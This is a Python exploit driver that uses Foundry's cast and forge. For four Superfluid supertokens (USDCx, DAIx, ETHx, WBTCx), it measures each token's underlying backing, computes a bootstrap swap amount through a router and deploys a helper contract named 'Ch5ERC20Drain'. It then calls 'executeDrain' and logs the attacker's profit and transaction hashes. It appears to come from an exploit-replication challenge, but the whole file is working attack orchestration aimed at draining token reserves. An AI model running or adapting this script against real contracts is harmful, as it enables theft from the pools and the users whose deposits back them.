#!/usr/bin/env python3
import json, os, subprocess, time

RPC = os.environ['RPC_CH5_SUPERFLUID_V2']
ATTACKER = os.environ['PUBLIC_ADDRESS']
LOG = 'runs/exploit_1776535427.log'
KEYSTORE = 'runs/keystore/ch5tmp'
PASSFILE = 'runs/.ch5_keystore_password'
ROUTER = '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff'
WMATIC = '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270'
GAS_RESERVE = 5 * 10**18
TOKENS = [
    ('USDCx-tail', '0xCAa7349CEA390F89641fe306D93591f87595dc1F', 920000000, 250 * 10**18),
    ('DAIx', '0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2', 930000000, 250 * 10**18),
    ('ETHx', '0x27e1e4E6BC79D93032abef01025811B7E4727e85', 935000000, 250 * 10**18),
    ('WBTCx', '0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92', 940000000, 250 * 10**18),
]

def log(msg):
    with open(LOG, 'a') as f:
        f.write(msg + '\n')
    print(msg)

def run(cmd):
    out = subprocess.check_output(cmd, text=True)
    return out

def extract_json(blob: str):
    start = blob.find('{')
    if start == -1:
        raise RuntimeError(f'no json object in output: {blob}')
    return json.loads(blob[start:])

def cast_balance(addr):
    return int(run(['cast', 'balance', addr, '--rpc-url', RPC]).strip())

def cast_call_scalar(addr, sig, *args):
    out = run(['cast', 'call', addr, sig, *args, '--rpc-url', RPC, '--json'])
    data = json.loads(out)
    value = data[0]
    return int(value)

def quote_out(amount_in, underlying):
    out = run([
        'cast', 'call', ROUTER, 'getAmountsOut(uint256,address[])(uint256[])', str(amount_in),
        f'[{WMATIC},{underlying}]', '--rpc-url', RPC, '--json'
    ])
    return int(json.loads(out)[0][1])

def bootstrap_for_target(target, max_native, floor, underlying):
    if target <= 0 or max_native <= 0:
        return 0
    quoted_max = quote_out(max_native, underlying)
    if quoted_max <= target:
        result = max_native
    else:
        low, high = 1, max_native
        for _ in range(48):
            if low >= high:
                break
            mid = low + (high - low) // 2
            quoted = quote_out(mid, underlying)
            if quoted >= target:
                high = mid
            else:
                low = mid + 1
        result = low + low // 20 + 10**17
    result = max(result, floor)
    result = min(result, max_native)
    return result

def deploy(contract, *constructor_args):
    cmd = ['forge', 'create', contract, '--broadcast', '--json', '--rpc-url', RPC,
           '--keystore', KEYSTORE, '--password-file', PASSFILE]
    if constructor_args:
        cmd += ['--constructor-args', *map(str, constructor_args)]
    out = run(cmd)
    log(out.strip())
    data = extract_json(out)
    return data['deployedTo'], data['transactionHash']

def send(to, sig, value, gas_limit, *args):
    cmd = ['cast', 'send', '--gas-limit', str(gas_limit), '--value', str(value), '--json',
           '--rpc-url', RPC, '--keystore', KEYSTORE, '--password-file', PASSFILE,
           to, sig, *map(str, args)]
    out = run(cmd)
    log(out.strip())
    data = extract_json(out)
    return data['transactionHash']

def main():
    pre = cast_balance(ATTACKER)
    log(f'=== remaining-token broadcast {time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())} ===')
    log(f'pre_remaining_balance={pre}')
    tx_hashes = []

    for label, supertoken, index_base, floor in TOKENS:
        underlying_addr = run(['cast', 'call', supertoken, 'getUnderlyingToken()(address)', '--rpc-url', RPC]).strip()
        backing = cast_call_scalar(underlying_addr, 'balanceOf(address)(uint256)', supertoken)
        native = cast_balance(ATTACKER)
        spendable = max(0, native - GAS_RESERVE)
        target = backing // 12
        bootstrap = bootstrap_for_target(target, spendable, floor, underlying_addr)
        log(f'{label} native={native} backing={backing} target={target} bootstrap={bootstrap} underlying={underlying_addr}')
        if bootstrap == 0 or backing <= 1:
            log(f'{label} skipped')
            continue
        helper, tx = deploy('exploit/Run.s.sol:Ch5ERC20Drain', supertoken, ROUTER, index_base)
        tx_hashes.append(tx)
        log(f'{label} helper={helper}')
        tx = send(helper, 'executeDrain(uint256,uint256)', bootstrap, 12_000_000, 1, 10)
        tx_hashes.append(tx)
        time.sleep(2)
        post_balance = cast_balance(ATTACKER)
        post_backing = cast_call_scalar(underlying_addr, 'balanceOf(address)(uint256)', supertoken)
        log(f'{label} post_balance={post_balance} post_backing={post_backing}')

    post = cast_balance(ATTACKER)
    delta = post - pre
    log(f'post_remaining_balance={post} delta={delta}')
    with open('runs/.exploit_1776535427_tx_hashes_remaining', 'w') as f:
        for tx in tx_hashes:
            f.write(tx + '\n')

if __name__ == '__main__':
    main()
